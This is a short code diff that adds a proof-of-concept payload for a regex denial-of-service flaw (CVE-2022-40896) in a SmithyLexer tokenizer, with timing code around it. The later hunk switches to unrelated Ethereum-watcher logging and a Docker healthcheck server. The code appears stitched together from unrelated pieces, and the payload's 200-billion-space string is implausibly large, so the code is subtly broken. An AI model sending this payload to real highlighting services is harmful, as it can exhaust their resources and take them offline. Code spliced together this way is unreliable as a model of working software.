@@ -33,6 +33,7 @@ def highlight_smithy(user_text: str):
     return tokens
 
 def main():
+    # CVE-2022-40896 in SmithyLexer.
     payload = "metadata " + (" " * 200000000000) + "=" 
 
     t0 = time.time()
@@ -42,7 +43,8 @@ def main():
     print("tokenize time:", dt, "seconds")
     print("num tokens:", len(toks))
     BUILD_INFO.info(get_build_info())
-
+    ####
+    
     logger.info({'msg': 'Ethereum head watcher startup.'})
 
     logger.info({'msg': f'Start healthcheck server for Docker container on port {variables.HEALTHCHECK_SERVER_PORT}'})
